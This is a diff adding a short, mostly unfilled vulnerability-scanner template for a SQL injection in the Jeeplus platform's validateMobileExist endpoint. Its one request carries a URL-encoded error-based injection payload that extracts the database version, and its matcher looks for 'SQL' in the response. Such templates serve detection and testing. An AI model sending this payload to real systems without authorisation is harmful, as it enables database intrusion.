@@ -1,0 +1,16 @@
+id:
+info:
+  name: Jeeplus快速开发平台 validateMobileExist SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /a/sys/user/validateMobileExist?&mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+version%28%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271
+response1:
+  headers:
+  body: SQL
+  code:
+requests2:
+response2:
